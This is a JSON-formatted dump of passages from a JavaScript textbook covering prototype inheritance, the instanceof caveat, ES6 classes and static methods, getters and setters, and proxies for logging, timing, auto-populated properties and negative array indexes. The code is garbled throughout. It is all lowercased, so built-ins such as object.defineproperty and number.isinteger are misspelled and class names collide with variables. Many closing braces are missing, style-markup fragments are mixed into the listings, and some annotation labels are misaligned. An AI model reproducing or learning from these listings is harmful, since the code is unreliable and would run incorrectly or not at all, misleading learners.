clear way to determine whether an instance was created by a particular function constructor, it doesn't exactly work like that. instead, it checks whether the prototype of the right-side function is in the prototype chain of the object on the left. therefore, there is a caveat that we should be careful about.", "javascript-7.3.2.txt__5": "the instanceof caveat  as you've seen multiple times throughout this chapter, javascript is a dynamic language in which we can modify a lot of things during program execution. for example, there's nothing stopping us from changing the prototype of a constructor, as shown in the following listing.  listing 7.12. watch out for changes to constructor prototypes  function ninja(){}  const ninja = new ninja();  assert(ninja instanceof ninja, \"our ninja is a ninja!\");  ninja.prototype = {};  #a  assert(!(ninja instanceof ninja), \"the ninja is now not a ninja!?\");  #b  #a - we change the prototype of the ninja constructor function.  #b - even though our ninja instance was created by the ninja constructor, the instanceof operator now says that ninja isn't an instance of ninja anymore!  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":0},{\\\"line\\\":6,\\\"ch\\\":21}]]\"}  !@%style%@!", "javascript-7.3.txt__1": "7.3. achieving inheritance", "javascript-7.3.txt__2": "listing 7.7. trying to achieve inheritance with prototypes  function person(){}  #a  person.prototype.dance = function(){};  #a  function ninja(){}  #b  ninja.prototype = { dance: person.prototype.dance };  #c  const ninja = new ninja();  assert(ninja instanceof ninja,  \"ninja receives functionality from the ninja prototype\" );  assert(ninja instanceof person, \"... and the person prototype\" );  assert(ninja instanceof object, \"... and the object prototype\" );  #a - defines a dancing person via a constructor and its prototype  #b - defines a ninja  #c - attempts to make ninja a dancing person by copying the dance method from the person prototype  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-7.3.txt__3": "running our test reveals that although we may have taught the ninja to dance, we failed to make the ninja a person, as shown in figure 7.12. we taught the ninja to mimic the dance of a person, but that hasn't made the ninja a person. that's not inheritance\u2014it's just copying.  figure 7.12. our ninja isn't really a person. no happy dance!  apart from the fact that this approach isn't exactly working, we'd also need to copy each property of person to the ninja prototype individually. that's no way to do inheritance. let's keep exploring.", "javascript-7.3.txt__4": "subclass.prototype = new superclass();  for example:  ninja.prototype = new person();", "javascript-7.3.txt__5": "listing 7.8. achieving inheritance with prototypes  function person(){}  person.prototype.dance = function(){};  function ninja(){}  ninja.prototype = new person();  #a  const ninja = new ninja();  assert(ninja instanceof ninja,  \"ninja receives functionality from the ninja prototype\");  assert(ninja instanceof person, \"... and the person prototype\");  assert(ninja instanceof object, \"... and the object prototype\");  assert(typeof ninja.dance === \"function\", \"... and can dance!\")  #a - makes a ninja a person by making the ninja prototype an instance of person  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":4,\\\"ch\\\":16},{\\\"line\\\":4,\\\"ch\\\":31}],[{\\\"line\\\":13,\\\"ch\\\":0},{\\\"line\\\":13,\\\"ch\\\":79}]]\"}  !@%style%@!", "javascript-7.3.txt__6": "figure 7.13. our ninja is a person! let the victory dance begin.  figure 7.14. we've achieved inheritance by setting the prototype of the ninja constructor to a new instance of a person object.", "javascript-7.3.txt__7": "function person(){}  person.prototype.dance = function(){};  we also define a ninja function that gets its own prototype object with a constructor property referencing the ninja function: function ninja(){}.", "javascript-7.3.txt__8": "function ninja(){}  ninja.prototype = new person();  var ninja = new ninja();", "javascript-7.3.txt__9": "here's the important implication: when we perform an instanceof operation, we can determine whether the function inherits the functionality of any object in its prototype chain.  note", "javascript-7.4.1.txt__1": "7.4.1. using the class keyword  es6 introduces a new class keyword that provides a much more elegant way of creating objects and implementing inheritance than manually implementing it ourselves with prototypes. using the class keyword is easy, as shown in the following listing.  listing 7.13. creating a class in es6  class ninja{  #a  constructor(name){  #b  this.name = name;  #b  #b  swingsword(){  #c  return true;  #c  #c  var ninja = new ninja(\"yoshi\");  #d  assert(ninja instanceof ninja, \"our ninja is a ninja\");  #e  assert(ninja.name === \"yoshi\", \"named yoshi\");  #e  assert(ninja.swingsword(), \"and he can swing a sword\");  #e  #a - uses the class keyword to start specifying an es6 class  #b - defines a constructor function that will be called when we call the class with the keyword new  #c - defines an additional method accessible to all ninja instances  #d - instantiates a new ninja object with the keyword new  #e - tests for the expected behavior  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":0},{\\\"line\\\":0,\\\"ch\\\":5}],[{\\\"line\\\":16,\\\"ch\\\":14},{\\\"line\\\":16,\\\"ch\\\":19}],[{\\\"line\\\":17,\\\"ch\\\":73},{\\\"line\\\":17,\\\"ch\\\":78}]]\"}  !@%style%@!", "javascript-7.4.1.txt__2": "class ninja{  constructor(name){  this.name = name;  swingsword(){  return true;  next we can create a ninja instance by calling the ninja class with the keyword new, just as we would if ninja was a simple constructor function (as earlier in the chapter):  var ninja = new ninja(\"yoshi\");  finally, we can test that the ninja instance behaves as expected, that it's an instance-of ninja, has a name property, and has access to the swingsword method:  assert(ninja instanceof ninja, \"our ninja is a ninja\");  assert(ninja.name === \"yoshi\", \"named yoshi\");  assert(ninja.swingsword(), \"and he can swing a sword\");  classes are syntactic sugar  as mentioned earlier, even though es6 has introduced the class keyword, under the hood we're still dealing with good old prototypes; classes are syntactic sugar designed to make our lives a bit easier when mimicking classes in javascript.  our class code from listing 7.13 can be translated to functionally identical es5 code:  function ninja(name) {  this.name = name;  ninja.prototype.swingsword = function() {  return true;  };  as you can see, there's nothing especially new with es6 classes. the code is more elegant, but the same concepts are applied.  static methods  in the previous examples, you saw how to define object methods (prototype methods), accessible to all object instances. in addition to such methods, classical object-oriented languages such as java use static methods, methods defined on a class level. check out the following example.  listing 7.14. static methods in es6  class ninja{  constructor(name, level){  this.name = name;  this.level = level;  swingsword() {  return true;  static compare(ninja1, ninja2){  #a  return ninja1.level - ninja2.level;  #a  #a  var ninja1 = new ninja(\"yoshi\", 4);  var ninja2 = new ninja(\"hattori\", 3);  assert(!(\"compare\" in ninja1) && !(\"compare\" in ninja2),  #b  \"a ninja instance doesn't know how to compare\");  #b  assert(ninja.compare(ninja1, ninja2) > 0,  #c  \"the ninja class can do the comparison!\");  #c  assert(!(\"swingsword\" in ninja),  \"the ninja class cannot swing a sword\");  #a - uses the static keyword to make a static method  #b - ninja instances don't have access to compare.  #c - the class ninja has access to the compare method.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":10,\\\"ch\\\":2},{\\\"line\\\":10,\\\"ch\\\":8}],[{\\\"line\\\":27,\\\"ch\\\":14},{\\\"line\\\":27,\\\"ch\\\":20}]]\"}  !@%style%@!  we again create a ninja class that has a swingsword method accessible from all ninja instances. we also define a static method, compare, by prefixing the method name with the keyword static.  static compare(ninja1, ninja2){  return ninja1.level - ninja2.level;  the compare method, which compares the skill levels of two ninjas, is defined on the class level, and not the instance level! later we test that this effectively means that the compare method isn't accessible from ninja instances but is accessible from the ninja class:  assert(!(\"compare\" in ninja1) && !(\"compare\" in ninja2),  \"the ninja instance doesn't know how to compare\");  assert(ninja.compare(ninja1, ninja2) > 0,  \"the ninja class can do the comparison!\");", "javascript-7.4.2.txt__1": "7.4.2. implementing inheritance  to be honest, performing inheritance in pre-es6 code can be a pain. let's go back to our trusted ninjas, persons example:  function person(){}  person.prototype.dance = function(){};  function ninja(){}  ninja.prototype = new person();  object.defineproperty(ninja.prototype, \"constructor\", {  enumerable: false,  value: ninja,  writable: true  });", "javascript-7.4.txt__1": "7.4. using javascript \u201cclasses\u201d in es6  it's great that javascript lets us use a form of inheritance via prototypes. but many developers, especially those from a classical object-oriented background, would prefer a simplification or abstraction of javascript's inheritance system into one that they're more familiar with.", "javascript-8.1.1.txt__1": "8.1.1. defining getters and setters  in javascript, getter and setter methods can be defined in two ways:  by specifying them within object literals or within es6 class definitions  by using the built-in object.defineproperty method  explicit support for getters and setters has existed for quite some time now, since the days of es5. as always, let's explore the syntax through an example. in this case, we have an object storing a list of ninjas, and we want to be able to get and set the first ninja in the list.  listing 8.2. defining getters and setters in object literals  const ninjacollection = {  ninjas: [\"yoshi\", \"kuma\", \"hattori\"],  get firstninja(){  #a  report(\"getting firstninja\");  #a  return this.ninjas[0];  #a  },  #a  set firstninja(value){  #b  report(\"setting firstninja\");  #b  this.ninjas[0] = value;  #b  #b  };  assert(ninjacollection.firstninja === \"yoshi\",  #c  \"yoshi is the first ninja\");  #c  ninjacollection.firstninja = \"hachi\";  #d  assert(ninjacollection.firstninja === \"hachi\"  #e  && ninjacollection.ninjas[0] ===  \"hachi\",  #e  \"now hachi is the first ninja\");  #e  #a - defines a getter method for the firstninja property that returns the first ninja in our collection and logs a message  #b - defines a setter method for the firstninja property that modifies the first ninja in our collection and logs a message  #c - accesses the firstninja property as if it were a standard object property  #d - modifies the firstninja property as if it were a standard object property  #e - tests that the property modification is stored  !@%style%@!", "javascript-8.1.1.txt__2": "!@%style%@!  this example defines a ninjacollection object that has a standard property, ninjas, which references an array of ninjas, and a getter and a setter for the property firstninja. the general syntax for getters and setters is shown in figure 8.1.  figure 8.1. the syntax for defining getters and setters. prefix the property name with either the get or the set keyword.  as you can see, we define a getter property by prefixing the name with a get keyword, and a setter property with a set keyword.  in listing 8.2, both the getter and the setter log a message. in addition, the getter returns the value of the ninja at index 0, and the setter assigns a new value to the ninja at the same index:  get firstninja(){  report(\"getting firstninja\");  return this.ninjas[0];  },  set firstninja(value){  report(\"setting firstninja\");  this.ninjas[0] = value;  next, we test that accessing the getter property returns the first ninja, yoshi:  assert(ninjacollection.firstninja === \"yoshi\",  \"yoshi is the first ninja\");  notice that the getter property is accessed as if it were a standard object property (and not as the method that it is).  after we access a getter property, the associated getter method is implicitly called, the message getting firstninja is logged, and the value of the ninja at index 0 is returned.  we continue by taking advantage of our setter method, and writing to the firstninja property, again, just as we would assign a new value to a normal object property:  ninjacollection.firstninja = \"hachi\";  similar to the previous case, because the firstninja property has a setter method, whenever we assign a value to that property, the setter method is implicitly called. this logs the message setting firstninja and modifies the value of the ninja at index 0.  finally, we can test that our modification has done the work and that the new value of the ninja at index 0 can be accessed both through the ninjas collection and through our getter method:  assert(ninjacollection.firstninja === \"hachi\"  && ninjacollection.ninjas[0] ===  \"hachi\",  \"now hachi is the first ninja\");", "javascript-8.1.1.txt__3": "figure 8.2. the output from listing 8.2: if a property has a getter and a setter method, the getter method is implicitly called whenever we read the property value, and the setter method is called whenever we assign a new value to the property.  an important point to take from all this is that native getters and setters allow us to specify properties that are accessed as standard properties, but that are methods whose execution is triggered immediately when the property is accessed. this is further emphasized in figure 8.3.  figure 8.3. accessing a property with a getter method implicitly calls the matching getter. the process is the same as if this were a standard method call, and the getter method gets executed. a similar thing happens when we assign a value to a property through a setter method.  this syntax for defining a getter and a setter is straightforward, so it's no wonder that we can use the exact same syntax to define getters and setters in other situations. the following example uses es6 classes.  listing 8.3. using getters and setters with es6 classes  class ninjacollection {  constructor(){  this.ninjas = [\"yoshi\", \"kuma\", \"hattori\"];  get firstninja(){  #a  report(\"getting firstninja\");  #a  return this.ninjas[0];  #a  #a  set firstninja(value){  #a  report(\"setting firstninja\");  #a  this.ninjas[0] = value;  #a  const ninjacollection = new ninjacollection();  assert(ninjacollection.firstninja === \"yoshi\",  \"yoshi is the first ninja\");  ninjacollection.firstninja = \"hachi\";  assert(ninjacollection.firstninja === \"hachi\"  && ninjacollection.ninjas[0] ===  \"hachi\",  \"now hachi is the first ninja\");  #a - defines a getter and a setter within an es6 class  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":24,\\\"ch\\\":0},{\\\"line\\\":24,\\\"ch\\\":54}]]\"}  !@%style%@!  this modifies the code from listing 8.2 to include es6 classes. we keep all the tests to verify that the example still works as expected.  note", "javascript-8.1.1.txt__4": "although specifying getters and setters through es6 classes and object literals is easy, you've probably noticed something missing. traditionally, getters and setters are used to control access to private object properties, as in listing 8.1. unfortunately, as we already know from chapter 5, javascript doesn't have private object properties. instead, we can mimic them through closures, by defining variables and specifying object methods that will close over those variables. because with object literals and classes our getter and setter methods aren't created within the same function scope as variables that we could use for private object properties, we can't do this. luckily, there's an alternative way, through the object.defineproperty method.", "javascript-8.1.1.txt__5": "in chapter 7, you saw that the object.defineproperty method can be used to define new properties by passing in a property descriptor object. among other things, the property descriptor can include a get and a set property that define the property's getter and setter methods.  we'll use this feature to modify listing 8.1 to implement built-in getters and setters that control access to a \u201cprivate\u201d object property, as shown in the following listing.  listing 8.4. defining getters and setters with object.defineproperty  function ninja() {  #a  let _skilllevel = 0;  #b  object.defineproperty(this, 'skilllevel', {  #c  get: () => {  #d  report(\"the get method is called\");  #d  return _skilllevel;  #d  },  #d  set: value => {  #e  report(\"the set method is called\");  #e  _skilllevel = value;  #e  #e  });  const ninja = new ninja();  #f  assert(typeof ninja._skilllevel === \"undefined\",  #g  \"we cannot access a 'private' property\");  #g  assert(ninja.skilllevel === 0, \"the getter works fine!\");  #g  ninja.skilllevel = 10;  #h  assert(ninja.skilllevel === 10, \"the value was updated\");  #h  #a - defines a constructor function  #b - defines a \u201cprivate\u201d variable that will be accessible through function closures  #c - uses the built-in object.defineproperty to define a skilllevel property  #d - a get method that will be called whenever we read the skilllevel property  #e - a set method that will be called whenever we assign a value to the skilllevel property.  #f - creates a new ninja instance  #g - the private variable isn't accessible directly, but through the skilllevel getter.  #h - the set method is implicitly called when assigning to the skilllevel property.  !@%style%@!", "javascript-8.1.1.txt__6": "!@%style%@!  in this example, we first define a ninja constructor function with a _skilllevel variable that we'll use as a private variable, just as in listing 8.1.  next, on the newly created object, referenced by the this keyword, we define a skilllevel property by using the built-in object.defineproperty method:  object.defineproperty(this, 'skilllevel', {  get: () => {  report(\"the get method is called\");  return _skilllevel;  },  set: value => {  report(\"the set method is called\");  _skilllevel = value;  });  because we want the skilllevel property to control access to a private variable, we specify a get and a set method that will be called whenever the property is accessed.", "javascript-8.1.1.txt__7": "the rest of the code works exactly as in the previous examples. we create a new ninja instance and check that we can't access the private variable directly. instead, all interactions have to go through the getter and setter, which we now use just as if they were standard object properties:  ninja.skilllevel === 0  #a  ninja.skilllevel = 10  #b  #a - activates the getter method  #b - activates the setter method  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  as you can see, the approach with object.defineproperty is more verbose and complicated than getters and setters in object literals and classes. but in certain cases, when we need private object properties, it's well worth it.", "javascript-8.1.2.txt__1": "8.1.2. using getters and setters to validate property values", "javascript-8.1.2.txt__2": "listing 8.5. validating property value assignments with setters  function ninja() {  let _skilllevel = 0;  object.defineproperty(this, 'skilllevel', {  get: () => _skilllevel,  set: value => {  if(!number.isinteger(value)){  #a  throw new typeerror(\"skill level should be a number\");  #a  #a  _skilllevel = value;  });  const ninja = new ninja();  ninja.skilllevel = 10;  #b  assert(ninja.skilllevel === 10, \"the value was updated\");  #b  try {  #c  ninja.skilllevel = \"great\";  #c  fail(\"should not be here\");  #c  } catch(e){  #c  pass(\"setting a non-integer value throws an exception\");  #c  #c  #a - checks whether the passed-in value is an integer. if it isn't, an exception is thrown.  #b - we can assign an integer value to the property.  #c - trying to assign a noninteger value (in this case, a string) results in an exception thrown from the setter method.  !@%style%@!", "javascript-8.1.2.txt__3": "!@%style%@!", "javascript-8.1.3.txt__1": "8.1.3. using getters and setters to define computed properties", "javascript-8.1.3.txt__2": "listing 8.6. defining computed properties  const shogun = {  name: \"yoshiaki\",  clan: \"ashikaga\",  get fulltitle(){  #a  return this.name + \" \" + this.clan;  #a  },  #a  set fulltitle(value) {  #b  const segments = value.split(\" \");  #b  this.name = segments[0];  #b  this.clan = segments[1];  #b  #b  };  assert(shogun.name === \"yoshiaki\", \"our shogun yoshiaki\");  #c  assert(shogun.clan === \"ashikaga\", \"of clan ashikaga\");  #c  assert(shogun.fulltitle === \"yoshiaki ashikaga\",  #c  \"the full name is now yoshiaki ashikaga\");  #c  shogun.fulltitle = \"ieyasu tokugawa\";  #d  assert(shogun.name === \"ieyasu\", \"our shogun ieyasu\");  #d  assert(shogun.clan === \"tokugawa\", \"of clan tokugawa\");  #d  assert(shogun.fulltitle === \"ieyasu tokugawa\",  #d  \"the full name is now ieyasu tokugawa\");  #d  #a - defines a getter method on a fulltitle property of an object literal that calculates the value by concatenating two object properties  #b - defines a setter method on a fulltitle property of an object literal that splits the passed-in value and updates two standard properties  #c - the name and clan properties are normal properties whose values are directly obtained. accessing the fulltitle property calls the get method, which computes the value.  #d - assigning a value to the fulltitle property calls the set method, which computes and assigns new values to the name and clan properties.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":3,\\\"ch\\\":2},{\\\"line\\\":3,\\\"ch\\\":18}]]\"}  !@%style%@!  here we define a shogun object, with two standard properties, name and clan. in addition, we specify a getter and a setter method for a computed property, fulltitle:  const shogun = {  name: \"yoshiaki\",  clan: \"ashikaga\",  get fulltitle(){  return this.name + \" \" + this.clan;  },  set fulltitle(value) {  const segments = value.split(\" \");  this.name = segments[0];  this.clan = segments[1];  };", "javascript-8.1.3.txt__3": "this takes care of both routes: reading the fulltitle property computes its value, and writing to the fulltitle property modifies the properties that constitute the property value.", "javascript-8.1.3.txt__4": "this concludes our exploration of getters and setters. you've seen that they're a useful addition to the language that can help us deal with logging, data validation, and detecting changes in property values. unfortunately, sometimes this isn't enough. in certain cases, we need to control all types of interactions with our objects, and for this, we can use a completely new type of object: a proxy.", "javascript-8.1.txt__1": "8.1. controlling access to properties with getters and setters  in javascript, objects are relatively simple collections of properties. the primary way to keep track of our program state is by modifying those properties. for example, consider the following code:  function ninja (level) {  this.skilllevel = level;  const ninja = new ninja(100);  here we define a ninja constructor that creates ninja objects with a property skilllevel. later, if we want to change the value of that property, we can write the following code: ninja.skilllevel = 20.  that's all nice and convenient, but what happens in the following cases?  we want to safeguard against accidental mistakes, such as assigning unanticipated data. for example, we want to stop ourselves from doing something like assigning a value of a wrong type: ninja.skilllevel = \"high\".  we want to log all changes to the skilllevel property.  we need to show the value of our skilllevel property somewhere in the ui of our web page. naturally, we want to present the last, up-to-date value of the property, but how can we easily do this?  we can handle all of these cases elegantly with getter and setter methods.", "javascript-8.1.txt__2": "listing 8.1. using getters and setters to guard private properties  function ninja () {  let skilllevel;  #a  this.getskilllevel = () => skilllevel;  #b  this.setskilllevel = value => {  #c  skilllevel = value;  #c  };  #c  const ninja = new ninja();  ninja.setskilllevel(100);  #d  assert(ninja.getskilllevel() === 100,  #e  \"our ninja is at level 100!\");  #e  #a - defines a private skilllevel variable  #b - the getter method controls access to our private skilllevel variable.  #c - the setter method controls the values we can assign to skilllevel.  #d - sets a new value of skilllevel through the setter method  #e - retrieves the value of skilllevel with the getter method  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-8.1.txt__3": "now, if we want to log all read attempts of the skilllevel property, we expand the getskilllevel method; and if we want to react to all write attempts, we expand the setskilllevel method, as in the following snippet:  function ninja () {  let skilllevel;  this.getskilllevel = () => {  report(\"getting skill level value\");  #a  return skilllevel;  };  this.setskilllevel = value => {  report(\"modifying skilllevel property from:\",  skilllevel, \"to: \", value);  #b  skilllevel = value;  #b  #a - using getters, we can know whenever code accesses a property.  #b - using setters, we can know whenever code wants to set a new value to a property.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":4,\\\"ch\\\":4},{\\\"line\\\":4,\\\"ch\\\":40}]]\"}  !@%style%@!  this is great. we can easily react to all interactions with our properties by plugging in, for example, logging, data validation, or other side effects such as ui modifications.", "javascript-8.1.txt__4": "luckily, javascript has built-in support for true getters and setters: properties that are accessed as normal data properties (for example, ninja.skilllevel), but that are methods that can compute the value of a requested property, validate the passed-in value, or whatever else we need them to do. let's take a look at this built-in support.", "javascript-8.2.1.txt__1": "8.2.1. using proxies for logging", "javascript-8.2.1.txt__2": "unfortunately, when implementing logging, we usually scatter logging statements throughout the code. take a look at the ninja example used earlier in the chapter.  listing 8.8. logging without proxies  function ninja() {  let _skilllevel = 0;  object.defineproperty(this, 'skilllevel', {  get: () => {  report(\"skilllevel get method is called\");  #a  return _skilllevel;  },  set: value => {  report(\"skilllevel set method is called\");  #b  _skilllevel = value;  });  const ninja = new ninja();  ninja.skilllevel;  #c  ninja.skilllevel = 4;  #d  #a - we log whenever the skilllevel property is read...  #b - ...and whenever the skilllevel property is written to.  #c - reads the skilllevel property and triggers the get method  #d - writes to the skilllevel property and triggers the set method  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  we define a ninja constructor function that adds a getter and a setter to the skilllevel property, which log all attempts of reading and writing to that property.", "javascript-8.2.1.txt__3": "luckily, one of the straightforward uses of proxies is to enable logging whenever we read or write to a property, but in a much nicer and cleaner way. consider the following example.  listing 8.9. using proxies makes it easier to add logging to objects  function makeloggable(target){  #a  return new proxy(target, {  #b  get: (target, property) => {  #c  report(\"reading \" + property);  #c  return target[property];  #c  },  #c  set: (target, property, value) => {  #d  report(\"writing value \" + value + \" to \" + property);  #d  target[property] = value;  #d  #d  });  let ninja = { name: \"yoshi\"};  #e  ninja = makeloggable(ninja);  #e  assert(ninja.name === \"yoshi\", \"our ninja yoshi\");  #f  ninja.weapon = \"sword\";  #f  #a - defines a function that takes a target object and makes it loggable  #b - creates a new proxy with that target object  #c - a get trap that logs property reads  #d - a set trap that logs property writes  #e - creates a new ninja object that will serve as our target object and make it loggable  #f - reads and writes to our proxy object. these actions are logged by the proxy traps.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":2,\\\"ch\\\":4},{\\\"line\\\":2,\\\"ch\\\":32}],[{\\\"line\\\":7,\\\"ch\\\":4},{\\\"line\\\":7,\\\"ch\\\":39}]]\"}  !@%style%@!  here we define a makeloggable function that takes a target object and returns a new proxy that has a handler with a get and a set trap. these traps, besides reading and writing to the property, log the information about which property is read or written to.", "javascript-8.2.1.txt__4": "whenever we try to read a property (for example, with ninja.name), the get trap will be called, and the information about which property has been read will be logged. a similar thing will happen when writing to a property: ninja.weapon = \"sword\".", "javascript-8.2.2.txt__1": "8.2.2. using proxies for measuring performance", "javascript-8.2.2.txt__2": "listing 8.10. measuring performance with proxies  function isprime(number){  #a  if(number < 2) { return false; }  #a  #a  for(let i = 2; i < number; i++) {  #a  if(number % i === 0) { return false; }  #a  #a  #a  return true;  #a  #a  isprime = new proxy(isprime, {  #b  apply: (target, thisarg, args) => {  #c  console.time(\"isprime\");  #d  const result = target.apply(thisarg, args);  #e  console.timeend(\"isprime\");  #f  return result;  });  isprime(1299827);  #g  #a - defines a primitive implementation of the isprime function  #b - wraps the isprime function within a proxy  #c - provides an apply trap that will be called whenever a proxy is called as a function  #d - starts a timer called isprime  #e - invokes the target function  #f - stops the timer and outputs the result  #g - calls the function. the call works the same as if we'd called the original function.  !@%style%@!", "javascript-8.2.2.txt__3": "!@%style%@!  in this example, we have a simple isprime function. (the exact function doesn't matter; we're using it as an example of a function whose execution can last a nontrivial amount of time.)  now imagine that we need to measure the performance of the isprime function, but without modifying its code. we could wrap the function into a proxy that has a trap that will be called whenever the function is called:  isprime = new proxy(isprime, {  apply: (target, thisarg, args) => {  ...  });  we use the isprime function as the target object of a newly constructed proxy. in addition, we supply a handler with an apply trap that will be executed on function invocation.", "javascript-8.2.3.txt__1": "8.2.3. using proxies to autopopulate properties", "javascript-8.2.3.txt__2": "rootfolder.ninjasdir.firstninjadir.ninjafile = \"yoshi.txt\";  to create this, you might write something along the following lines:  const rootfolder = new folder();  rootfolder.ninjasdir = new folder();  rootfolder.ninjasdir.firstninjadir = new folder();  rootfolder.ninjasdir.firstninjadir.ninjafile = \"yoshi.txt\";  seems a tad more tedious than necessary, doesn't it? this is where autopopulating properties comes into play; just take a look at the following example.  listing 8.11. autopopulating properties with proxies  function folder() {  return new proxy({}, {  get: (target, property) => {  report(\"reading \" + property);  #a  if(!(property in target)) {  #b  target[property] = new folder();  #b  #b  return target[property];  });  const rootfolder = new folder();  try {  rootfolder.ninjasdir.firstninjadir.ninjafile = \"yoshi.txt\";  #c  pass(\"an exception wasn't raised\");  #d  catch(e){  fail(\"an exception has occurred\");  #a - logs all readings to our object  #b - if the accessed property doesn't exist, we create it.  #c - whenever a property is accessed, the get trap, which creates a property if it doesn't exist, is activated.  #d - no exception will be raised.  !@%style%@!", "javascript-8.2.3.txt__3": "!@%style%@!  normally, if we consider only the following code, we'd expect an exception to be raised:  const rootfolder = new folder();  rootfolder.ninjasdir.firstninjadir.ninjafile = \"yoshi.txt\";  we're accessing a property, firstninjadir, of an undefined property, ninjasdir, of the rootfolder object. but if we run the code, you see that all is well, as shown in figure 8.5.  figure 8.5. the output of running the code from listing 8.11", "javascript-8.2.4.txt__1": "8.2.4. using proxies to implement negative array indexes  in our day-to-day programming, we'll usually work with a lot of arrays. let's explore how to take advantage of proxies to make our dealings with arrays a little more pleasant.  if your programming background is from languages such as python, ruby, or perl, you might be used to negative array indexes, which enable you to use negative indexes to access array items from the back, as shown in the following snippet:  const ninjas = [\"yoshi\", \"kuma\", \"hattori\"];  ninjas[0]; //\"yoshi\"  #a  ninjas[1]; //\"kuma\"  #a  ninjas[2]; //\"hattori\"  #a  ninjas[-1]; //\"hattori\"  #b  ninjas[-2]; //\"kuma\"  #b  ninjas[-3]; //\"yoshi\"  #b  #a - standard access to array items, with positive array indexes  #b - negative array indexes enable us to access array items from the back, starting with \u20131, which accesses the last array item.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  now compare the code that we normally use to access the last item in the array, ninjas [ninjas.length-1], with the code that we can use if our language of choice supports negative array indexes, ninjas[-1]. see how much more elegant this is?", "javascript-8.2.4.txt__2": "listing 8.12. negative array indexes with proxies  function createnegativearrayproxy(array){  if (!array.isarray(array)) {  #a  throw new typeerror('expected an array');  #a  #a  return new proxy(array, {  #b  get: (target, index) => {  #c  index = +index;  #d  return target[index < 0 ? target.length + index : index];  #e  },  set: (target, index, val) => {  #f  index = +index;  return target[index < 0 ? target.length + index : index] = val;  });  const ninjas = [\"yoshi\", \"kuma\", \"hattori\"];  #g  const proxiedninjas = createnegativearrayproxy(ninjas);  #h  assert(ninjas[0] === \"yoshi\" && ninjas[1] === \"kuma\"  #i  && ninjas[2] === \"hattori\",  #i  \"array items accessed through positive indexes\");  #i  #i  assert(proxiedninjas[0] === \"yoshi\" && proxiedninjas[1] === \"kuma\"  #i  && proxiedninjas [2] === \"hattori\",  #i  \"array items accessed through positive indexes on a proxy\");  #i  assert(typeof ninjas[-1] === \"undefined\"  #j  && typeof ninjas[-2] === \"undefined\"  && typeof ninjas[-3] === \"undefined\",  \"items cannot be accessed through negative indexes on an array\");  assert(proxiedninjas[-1] === \"hattori\"  #k  && proxiedninjas[-2] === \"kuma\"  && proxiedninjas[-3] === \"yoshi\",  \"but they can be accessed through negative indexes\");  proxiedninjas[-1] = \"hachi\";  #l  assert(proxiedninjas[-1] === \"hachi\" && ninjas[2] === \"hachi\",  #l  \"items can be changed through negative indexes\");  #l  #a - if our target object isn't an array, throw an exception.  #b - returns a new proxy that takes in the array and uses it as a proxy target  #c - the get trap is activated whenever an array index is read.  #d - turns the property name into a number with the unary plus operator  #e - if the read index is a negative number, read from the back of the array, and if it's a positive number, access it normally.  #f - the set trap is activated whenever an array index is written to.  #g - creates a standard array  #h - passes it into our function that will create a proxy to that array  #i - checks that we can access array items through the original array as well as through the proxy  #j - checks that we can't access array items through negative indexes in a standard array...  #k - ...but that we can do it through our proxy, because we've supplied a get trap that handles the case.  #l - we can also modify array items from the back, but only if we go through the proxy.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this example, we define a function that will create a proxy for a passed-in array. because we don't want our proxy to work with other types of objects, we throw an exception in case the argument isn't an array:  if (!array.isarray(array)) {  throw new typeerror('expected an array');  we continue by creating and returning a new proxy with two traps, a get trap that will activate whenever we try to read an array item, and a set trap that will activate whenever we write to an array item:  return new proxy(array, {  get: (target, index) => {  index = +index;  return target[index < 0 ? target.length + index : index];  },  set: (target, index, val) => {  index = +index;  return target[index < 0 ? target.length + index : index] = val;  });", "javascript-8.2.5.txt__1": "8.2.5. performance costs of proxies", "javascript-8.2.5.txt__2": "to test these performance issues, we can build on the negative array indexes example from listing 8.12 and compare the execution time when accessing items in a normal array versus accessing items through a proxy, as shown in the following listing.  listing 8.13. checking the performance limitations of proxies  function measure(items){  const starttime = new date().gettime();  #a  for(let i = 0; i < 500000; i++){  #b  items[0] === \"yoshi\";  #b  items[1] === \"kuma\";  #b  items[2] === \"hattori\";  #b  #b  return new date().gettime() - starttime;  #c  const ninjas = [\"yoshi\", \"kuma\", \"hattori\"];  #d  const proxiedninjas = createnegativearrayproxy(ninjas);  #d  console.log(\"proxies are around\",  math.round(measure(proxiedninjas)/ measure(ninjas)),  #e  \"times slower\");  #a - accesses the items in our collection in a long-running loop  #b - gets the current time before running a long-running operation  #c - measures the time it took for the long-running code to execute  #d - compares the running time when accessing the standard array versus when accessing through a proxy  #e - creates a standard array and a proxy for that array  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: 